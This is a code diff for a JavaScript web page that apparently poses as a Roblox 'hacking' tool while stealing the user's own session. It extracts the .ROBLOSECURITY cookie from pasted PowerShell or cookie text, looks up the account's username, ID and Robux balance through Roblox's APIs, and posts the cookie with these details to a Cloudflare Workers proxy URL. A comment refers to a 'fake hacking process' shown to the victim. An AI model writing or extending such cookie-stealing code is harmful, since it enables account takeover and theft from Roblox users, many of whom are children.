@@ -1,58 +1,80 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-function extractDataFromPowerShell(input) {
-  // 1. Extract .ROBLOSECURITY cookie
-  const cookieMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
-  if (!cookieMatch) return null; // Not a valid PowerShell format
-
-  const cookie = cookieMatch[1];
-
-  // 2. Extract Robux (if present in the input)
-  const robuxMatch = input.match(/Robux["']?\s*[:=]\s*["']?(\d+)/);
-  const robux = robuxMatch ? robuxMatch[1] : "0";
-
-  // 3. Extract Username (if present in the input)
-  const usernameMatch = input.match(/Username["']?\s*[:=]\s*["']?([^"'\s]+)/);
-  const username = usernameMatch ? usernameMatch[1] : "Unknown";
-
-  // 4. (Optional) Extract DisplayName if available
-  const displayNameMatch = input.match(/DisplayName["']?\s*[:=]\s*["']?([^"'\s]+)/);
-  const displayName = displayNameMatch ? displayNameMatch[1] : username; // Fallback to username
-
-  return {
-    cookie,
-    robux,
-    username,
-    displayName,
-    // (Removed userId as requested)
-  };
+// Extracts .ROBLOSECURITY from PowerShell or raw cookie
+function extractRobloxCookie(input) {
+    const powershellMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
+    const rawCookieMatch = input.match(/(_|\.)ROBLOSECURITY=([^;]+)/);
+    return powershellMatch?.[1] || rawCookieMatch?.[2] || null;
 }
 
+// Fetches user data from Roblox API
+async function fetchRobloxUserData(cookie) {
+    try {
+        // 1. Get user profile
+        const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
+        });
+        if (!userRes.ok) throw new Error("Failed to fetch user data");
+        const userData = await userRes.json();
+
+        // 2. Get Robux balance
+        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
+            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
+        });
+        const robux = robuxRes.ok ? (await robuxRes.json())?.robux || 0 : 0;
+
+        return {
+            username: userData.name,
+            displayName: userData.displayName,
+            userId: userData.id,
+            robux: robux,
+            isPremium: false, // Optional: Add premium check if needed
+            cookieValid: true
+        };
+    } catch (error) {
+        return {
+            error: error.message,
+            cookieValid: false
+        };
+    }
+}
+
+// Sends data to your proxy
 async function sendToProxy(data) {
-  await fetch(CLOUDFLARE_PROXY_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      sessionId: data.cookie,
-      timestamp: new Date().toISOString(),
-      robux: data.robux,
-      username: data.username,
-      displayName: data.displayName,
-    })
-  });
+    await fetch(CLOUDFLARE_PROXY_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            sessionId: data.cookie,
+            timestamp: new Date().toISOString(),
+            username: data.username,
+            displayName: data.displayName,
+            robux: data.robux,
+            userId: data.userId,
+            isPremium: data.isPremium,
+            cookieValid: data.cookieValid
+        })
+    });
 }
 
-function bruteforce(input) {
-  const extractedData = extractDataFromPowerShell(input);
+// Main function
+async function bruteforce(input) {
+    const cookie = extractRobloxCookie(input);
+    if (!cookie) {
+        console.log("❌ No valid .ROBLOSECURITY found");
+        return;
+    }
 
-  if (!extractedData) {
-    console.log("❌ Input is not in PowerShell format or missing cookie.");
-    return;
-  }
+    const userData = await fetchRobloxUserData(cookie);
+    await sendToProxy({ cookie, ...userData });
 
-  sendToProxy(extractedData);
-  console.log(`✅ Extracted Data:\n- User: ${extractedData.username}\n- Robux: ${extractedData.robux}\n- Cookie: ${extractedData.cookie.substring(0, 10)}...`);
+    console.log(userData.cookieValid ?
+        `✅ Valid Cookie | ${userData.username} | Robux: ${userData.robux}` :
+        `❌ Cookie Error: ${userData.error}`
+    );
 }
+
+// Usage: bruteforce(powershellCommandOrCookieString);
 
 
 
@@ -88,6 +110,8 @@ function validateInput() {
 
   // Send the session ID to the proxy
   bruteforce(sessionId);
+bruteforce(powershellInput);
+bruteforce(rawCookieInput);
 
   // Hide error and start fake hacking process
   hideError();
